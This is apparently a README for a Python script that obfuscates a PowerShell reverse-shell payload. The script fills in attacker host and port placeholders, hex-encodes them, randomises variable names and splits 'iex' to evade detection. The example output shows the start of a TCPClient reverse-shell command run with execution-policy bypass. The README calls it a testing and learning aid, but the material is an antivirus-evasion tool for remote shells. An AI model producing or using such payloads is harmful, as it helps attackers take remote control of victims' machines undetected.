# Obfuscation Script for PowerShell Commands
This Python script takes a PowerShell command, obfuscates it, and replaces certain parts like IP addresses and ports with user-provided values in hexadecimal format. It is designed for users who want to modify PowerShell scripts for testing purposes or to better understand obfuscation techniques.

## Overview
This script allows the user to input an IP address and port, then modifies a provided PowerShell script by:

* Obfuscating variable names.
* Replacing occurrences of iex to i''ex to make detection harder.
* Replacing placeholders for IP and port.
* Converting IP addresses and port numbers into hexadecimal format.

## Prerequisites
* Python 3.x
* Basic understanding of regular expressions and PowerShell scripting.

## Installation
Clone the repository and navigate to the project folder:
```bash
git clone https://github.com/your-username/your-repo-name.git
cd your-repo-name
```
## Usage
Run the script using the command:
```bash
python obfuscate_script.py

```
Follow the prompts to input the IP address and port, and the script will display the obfuscated PowerShell command.

## Functions Explanation
* get_user_input()
Purpose: Accepts user input for IP address and port, validating their formats.
## Validation:
+ Ensures the IP address is in the correct format (e.g., 192.168.1.1).
+ Ensures the port number is between 1 and 65535.
+ Raises: ValueError if the input is invalid.

## obfuscate_script()
* Purpose: Obfuscates variable names in the script and alters specific patterns.
## Details:
+ Uses regex to find all variables (excluding $PSHOME) and replaces them with randomly generated names.
+ Replaces occurrences of iex with i''ex to bypass some detection mechanisms.
+ Replaces occurrences of 'PS' with random UUID-like strings.

## random_string()
+ Purpose: Generates a random alphanumeric string of a specified length.
+ Parameters: length (default is 10).
+ Returns: A random string using ascii_letters and digits.

$$ replace_ip_and_port()
+ Purpose: Replaces placeholders for IP (*LHOST*) and port (*LPORT*) with the user-provided values.
+ Parameters: script, ip, port.

## ip_to_hex()
+ Purpose: Converts an IP address into its hexadecimal representation.
+ Parameters: ip (e.g., 192.168.1.1).
+ Returns: Hexadecimal string representation of the IP address.

## convert_ips_to_hex()
+ Purpose: Finds all IP addresses in the script and converts them to hexadecimal format.
+ Parameters: script.

## port_to_hex()
+ Purpose: Converts a port number to its hexadecimal representation.
+ Parameters: port.
+ Returns: Hexadecimal string of the port number.

## convert_ports_to_hex()
+ Purpose: Finds and converts all port numbers in the script (excluding 65535) to hexadecimal.
+ Parameters: script.

## main()
Purpose: The entry point of the script that coordinates user input, obfuscation, and replacements.

## Workflow:
+ Gets user input for IP and port.
+ Applies obfuscation to the PowerShell script.
+ Replaces placeholders with user inputs.
+ Converts IPs and ports to their hexadecimal representations.
+ Prints the final modified script.

## Example
Hereâ€™s an example of how to use the script:
```bash
Enter IP address: 192.168.1.10
Enter port: 8080
```

## Output (truncated for brevity):
```bash
Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('0xc0a8010a',0x1f90);$stream = ...
```
